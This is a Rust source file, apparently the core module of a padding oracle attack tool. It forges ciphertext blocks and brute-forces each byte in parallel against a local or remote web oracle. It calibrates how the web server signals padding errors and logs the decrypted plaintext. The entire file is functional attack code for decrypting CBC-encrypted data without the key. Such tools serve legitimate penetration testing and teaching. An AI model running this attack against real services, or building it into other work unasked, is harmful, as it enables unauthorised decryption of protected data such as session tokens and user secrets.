pub mod calibration_response;

use std::{collections::HashMap, mem};

use anyhow::{anyhow, Result};
use log::{debug, error, info, warn};
use rayon::iter::{IntoParallelIterator, IntoParallelRefMutIterator, ParallelIterator};
use reqwest::blocking::Response;
use retry::{delay::Fibonacci, retry_with_index, OperationResult};

use crate::{
    block::block_size::BlockSizeTrait,
    cypher_text::{encode::AmountBlocksTrait, forged_cypher_text::ForgedCypherText, CypherText},
    logging::LOG_TARGET,
    oracle::{web::calibrate_web::CalibrationWebOracle, Oracle},
    questioning::calibration_response::CalibrationResponse,
    tui::ui_update::UiUpdate,
};

const RETRY_DELAY_MS: u64 = 100;
const RETRY_MAX_ATTEMPTS: u64 = 3;

/// Manages the oracle attack on a high level.
pub(super) struct Questioning<'a, U>
where
    U: FnMut(UiUpdate) + Sync + Send + Clone,
{
    forged_cypher_texts: Vec<ForgedCypherText<'a>>,
    update_ui_callback: U,
}

impl<'a, U> Questioning<'a, U>
where
    U: FnMut(UiUpdate) + Sync + Send + Clone,
{
    /// Divides the cypher text into a modifiable part for each block.
    pub(super) fn prepare(
        update_ui_callback: U,
        cypher_text: &'a CypherText,
        no_iv: bool,
    ) -> Result<Self> {
        let blocks_to_skip = if no_iv { 0 } else { 1 };

        debug!(
            target: LOG_TARGET,
            "Preparing {} forged cypher texts to decrypt blocks",
            cypher_text.amount_blocks() - blocks_to_skip
        );
        let mut forged_cypher_texts =
            Vec::with_capacity(cypher_text.amount_blocks() - blocks_to_skip);
        // decryption is based on recognizing padding. Padding is only at the end of a message. So to decrypt the n-th block, all blocks after it have to be dropped and the "n - 1"-th block must be forged.
        for block_to_decrypt_idx in blocks_to_skip..cypher_text.amount_blocks() {
            match ForgedCypherText::from_part_of_cypher_text(cypher_text, block_to_decrypt_idx) {
                Ok(forged_cypher_text) => forged_cypher_texts.push(forged_cypher_text),
                Err(e) => error!(target: LOG_TARGET, "{:?}", e),
            };
        }

        Ok(Self {
            forged_cypher_texts,
            update_ui_callback,
        })
    }

    /// Actually performs the oracle attack for each block.
    pub(super) fn start(&mut self, oracle: impl Oracle) -> Result<()> {
        self.forged_cypher_texts.par_iter_mut().try_for_each(
            |forged_cypher_text| -> Result<()> {
                let block_to_decrypt_idx = forged_cypher_text.amount_blocks() - 1;
                let block_size = *forged_cypher_text.block_size() as usize;

                let mut bytes_answered = 0;
                let mut attempts_to_solve_byte = 1;
                while bytes_answered < block_size {
                    // TODO: using `parallel-stream` instead of `rayon` would likely be better. The oracle does the hard work, i.e. decryption, and is usually remote. So we're I/O bound, which prefers async, instead of CPU bound.
                    let current_byte_solution = (u8::MIN..=u8::MAX)
                        .into_par_iter()
                        .map(|byte_value| {
                            let mut forged_cypher_text = forged_cypher_text.clone();
                            forged_cypher_text.set_current_byte(byte_value)?;

                            let correct_padding = retry_with_index(
                                Fibonacci::from_millis(RETRY_DELAY_MS),
                                |attempt| {
                                    validate_while_handling_retries(
                                        attempt,
                                        byte_value,
                                        block_to_decrypt_idx,
                                        block_size,
                                        bytes_answered,
                                        &oracle,
                                        &forged_cypher_text,
                                    )
                                },
                            )
                            .map_err(|e| anyhow!(e.to_string()))?;

                            // update UI with attempt
                            (self.update_ui_callback.clone())(UiUpdate::ForgedBlockWip((
                                forged_cypher_text.forged_block_wip().clone(),
                                block_to_decrypt_idx,
                            )));

                            if correct_padding {
                                debug!(
                                    target: LOG_TARGET,
                                    "Block {}, byte {}: solved!",
                                    block_to_decrypt_idx,
                                    block_size - bytes_answered,
                                );

                                forged_cypher_text.lock_byte()?;
                                Ok(forged_cypher_text)
                            } else {
                                Err(anyhow!(
                                    "Block {}, byte {}: padding invalid. Forged block was: {:?}",
                                    block_to_decrypt_idx,
                                    block_size - bytes_answered,
                                    forged_cypher_text.forged_block_wip()
                                ))
                            }
                        })
                        .find_any(|potential_solution| potential_solution.is_ok());

                    match current_byte_solution {
                        Some(current_solution) => {
                            match current_solution {
                                Ok(mut current_solution) => {
                                    // Swap the default prepared forged cypher text with the solved one. Given that we're iterating, this is basically a `map` operation. However, doing a map would require to deref, and thus clone, each value as well as collect, i.e. allocate, everything. This is just much easier.
                                    mem::swap(forged_cypher_text, &mut current_solution);

                                    bytes_answered += 1;
                                    attempts_to_solve_byte = 1;
                                    (self.update_ui_callback.clone())(UiUpdate::ProgressUpdate);
                                }
                                // handle errors from the validation checks above
                                Err(e) => error!(
                                    target: LOG_TARGET,
                                    "{:?}",
                                    e.context(format!(
                                        "Block {}, byte {}: decryption failed",
                                        block_to_decrypt_idx + 1,
                                        block_size - bytes_answered
                                    ))
                                ),
                            };
                        }
                        None => {
                            if attempts_to_solve_byte > RETRY_MAX_ATTEMPTS {
                                error!(
                                    target: LOG_TARGET,
                                    "Block {}, byte {}: decryption failed",
                                    block_to_decrypt_idx + 1,
                                    block_size - bytes_answered
                                );
                                return Err(anyhow!(
                                    "Block {}, byte {}: decryption failed",
                                    block_to_decrypt_idx + 1,
                                    block_size - bytes_answered
                                ));
                            }

                            warn!(
                                target: LOG_TARGET,
                                "Block {}, byte {}: retrying decryption ({}/{})",
                                block_to_decrypt_idx + 1,
                                block_size - bytes_answered,
                                attempts_to_solve_byte,
                                RETRY_MAX_ATTEMPTS
                            );
                            attempts_to_solve_byte += 1;
                        }
                    }
                }

                info!(
                    target: LOG_TARGET,
                    "Block {}: solved!", block_to_decrypt_idx,
                );
                (self.update_ui_callback.clone())(UiUpdate::ForgedBlock((
                    forged_cypher_text.forged_block_solution().clone(),
                    block_to_decrypt_idx,
                )));

                Ok(())
            },
        )?;

        let plain_text_solution = self
            .forged_cypher_texts
            .iter()
            .map(|forged_cypher_text| forged_cypher_text.plaintext_solution())
            .collect::<Result<String>>()?;
        if !plain_text_solution.is_empty() {
            info!(
                target: LOG_TARGET,
                "The gods have spoken: {}", plain_text_solution
            );
        }

        (self.update_ui_callback)(UiUpdate::SlowRedraw);
        Ok(())
    }

    /// Find how the web oracle responds in case of a padding error
    pub(super) fn calibrate_web_oracle(
        &mut self,
        oracle: CalibrationWebOracle,
    ) -> Result<CalibrationResponse> {
        let calibration_cypher_text = &self.forged_cypher_texts[0];

        let responses = (u8::MIN..=u8::MAX)
            .into_par_iter()
            .map(|byte_value| {
                // `clone` so we don't modify any forged cypher texts before the actual attack
                let mut forged_cypher_text = calibration_cypher_text.clone();

                forged_cypher_text.set_current_byte(byte_value)?;
                debug!(
                    target: LOG_TARGET,
                    "Calibration block: trying layout {:?}",
                    forged_cypher_text.forged_block_wip()
                );

                let response =
                    retry_with_index(Fibonacci::from_millis(RETRY_DELAY_MS), |attempt| {
                        calibrate_while_handling_retries(
                            attempt,
                            byte_value,
                            &oracle,
                            &forged_cypher_text,
                        )
                    })
                    .map_err(|e| anyhow!(e.to_string()))?;

                CalibrationResponse::from_response(response, *oracle.config().consider_body())
            })
            .collect::<Result<Vec<_>>>()
            .map_err(|e| {
                error!(
                    target: LOG_TARGET,
                    "Failed to request web server for calibration"
                );
                e
            })?;

        // false positive, the hashmap's key (`response`) is obviously not mutable
        #[allow(clippy::mutable_key_type)]
        let counted_responses = responses.into_iter().fold(
            HashMap::new(),
            |mut acc: HashMap<CalibrationResponse, usize>, response| {
                *acc.entry(response).or_default() += 1;
                acc
            },
        );

        let padding_error_response = counted_responses
            .into_iter()
            .max_by_key(|(_, seen)| *seen)
            .map(|(response, _)| response)
            .expect("The hashmap can only be empty if no responses were received, which can only happen if errors occurred. But errors were already resolved by unpacking the potential responses.");

        info!(
            target: LOG_TARGET,
            "Calibrated the web oracle! Using parameters:"
        );
        info!(
            target: LOG_TARGET,
            "- Status: {}",
            padding_error_response.status()
        );
        if let Some(location) = padding_error_response.location() {
            info!(target: LOG_TARGET, "- Location: {}", location.to_str()?);
        }
        if *oracle.config().consider_body() {
            info!(
                target: LOG_TARGET,
                "- Content length: {:?}",
                padding_error_response.content_length()
            );
        }

        Ok(padding_error_response)
    }
}

fn validate_while_handling_retries(
    attempt: u64,
    byte_value: u8,
    block_to_decrypt_idx: usize,
    block_size: usize,
    bytes_answered: usize,
    oracle: &impl Oracle,
    forged_cypher_text: &ForgedCypherText,
) -> OperationResult<bool, String> {
    if attempt > RETRY_MAX_ATTEMPTS {
        error!(
            target: LOG_TARGET,
            "Block {}, byte {}, value {}: validation failed",
            block_to_decrypt_idx,
            block_size - bytes_answered,
            byte_value
        );
        return OperationResult::Err(format!(
            "Block {}, byte {}, value {}: validation failed",
            block_to_decrypt_idx,
            block_size - bytes_answered,
            byte_value
        ));
    }
    match oracle.ask_validation(forged_cypher_text) {
        Ok(correct_padding) => OperationResult::Ok(correct_padding),
        Err(e) => {
            warn!(
                target: LOG_TARGET,
                "Block {}, byte {}, value {}: retrying validation ({}/{})",
                block_to_decrypt_idx,
                block_size - bytes_answered,
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            );
            debug!(target: LOG_TARGET, "{:?}", e);
            OperationResult::Retry(format!(
                "Block {}, byte {}, value {}: retrying validation ({}/{})",
                block_to_decrypt_idx,
                block_size - bytes_answered,
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            ))
        }
    }
}

fn calibrate_while_handling_retries(
    attempt: u64,
    byte_value: u8,
    oracle: &CalibrationWebOracle,
    forged_cypher_text: &ForgedCypherText,
) -> OperationResult<Response, String> {
    if attempt > RETRY_MAX_ATTEMPTS {
        error!(
            target: LOG_TARGET,
            "Calibration block, value {}: validation failed", byte_value
        );
        return OperationResult::Err(format!(
            "Calibration block, value {}: validation failed",
            byte_value
        ));
    }

    match oracle.ask_validation(forged_cypher_text) {
        Ok(correct_padding) => OperationResult::Ok(correct_padding),
        Err(e) => {
            warn!(
                target: LOG_TARGET,
                "Calibration block, value {}: retrying validation ({}/{})",
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            );
            debug!(target: LOG_TARGET, "{:?}", e);
            OperationResult::Retry(format!(
                "Calibration block, value {}: retrying validation ({}/{})",
                byte_value, attempt, RETRY_MAX_ATTEMPTS
            ))
        }
    }
}
